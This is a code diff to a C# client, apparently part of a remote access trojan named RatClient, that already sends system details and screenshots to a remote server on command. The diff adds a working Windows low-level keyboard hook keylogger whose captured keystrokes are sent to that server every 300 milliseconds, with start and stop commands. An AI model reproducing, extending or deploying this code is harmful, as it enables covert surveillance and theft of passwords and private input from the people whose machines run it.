@@ -9,17 +9,45 @@ using System.IO;
 using System.Windows.Forms;
 using System.Threading.Tasks;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using RatClient.Config;
 
 class Program
 {
+    private Config config = new Config();
+    // Keylogger implementation
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_KEYUP = 0x0101;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    private static StringBuilder keyStrokes = new StringBuilder();
+    private static System.Timers.Timer keySendTimer;
+    // Networking
     static TcpClient client;
     static NetworkStream stream;
-    static readonly string Server = "127.0.0.1";
-    static readonly int Port = 6666;
+    // Screen viewer
     static System.Timers.Timer screenshotTimer;
     static Queue<string> screenshotChunks = new Queue<string>();
-    static int bufferSize = 1024 * 5;
     static bool isSendingScreenshot = false;
+    // Config
+    static readonly string Server = Config.IP;
+    static readonly int Port = Config.Port;
+    static readonly int bufferSize = Config.BufferSize;
 
     static void Main(string[] args)
     {
@@ -29,6 +57,11 @@ class Program
             stream = client.GetStream();
 
             SendInfo();
+
+            // Initialize and start the timer
+            keySendTimer = new System.Timers.Timer(300); // Set the interval to 300 ms
+            keySendTimer.Elapsed += SendKeystrokes;
+            keySendTimer.Start();
 
             while (true)
             {
@@ -53,6 +86,14 @@ class Program
                 else if (responseJson["type"] == "stop_screenshots")
                 {
                     StopSendingScreenshots();
+                }
+                else if (responseJson["type"] == "start_keylogger")
+                {
+                    StartKeyLogger();
+                }
+                else if (responseJson["type"] == "stop_keylogger")
+                {
+                    StopKeyLogger();
                 }
             }
         }
@@ -84,7 +125,8 @@ class Program
         string pc = GetPC();
         string user = GetUser();
 
-        var jsonOSInfo = new {
+        var jsonOSInfo = new
+        {
             type = "info",
             os = osInfo.Item1 + " " + osInfo.Item2,
             pc = pc,
@@ -94,7 +136,8 @@ class Program
     }
     static void SendMessage(string message)
     {
-        var jsonMessage = new {
+        var jsonMessage = new
+        {
             type = "message",
             text = message
         };
@@ -192,6 +235,62 @@ class Program
             return memoryStream.ToArray();
         }
     }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+    {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule)
+        {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        try
+        {
+            // Ensure that the event is a keyboard event
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                keyStrokes.Append((Keys)vkCode + "\n");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error in HookCallback: " + ex.Message);
+            // Consider whether to disconnect or just log the error
+        }
+
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    static void StartKeyLogger()
+    {
+        _hookID = SetHook(_proc);
+        Application.Run();
+    }
+
+    static void StopKeyLogger()
+    {
+        if (_hookID != IntPtr.Zero)
+        {
+            UnhookWindowsHookEx(_hookID);
+            _hookID = IntPtr.Zero;
+        }
+    }
+
+    static void SendKeystrokes(object sender, ElapsedEventArgs e)
+    {
+        if (keyStrokes.Length > 0)
+        {
+            SendJson(new { type = "keystroke", key = keyStrokes.ToString() });
+            keyStrokes.Clear(); // Clear the buffer after sending
+        }
+    }
+
     static void SendJson(object jsonObject)
     {
         string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
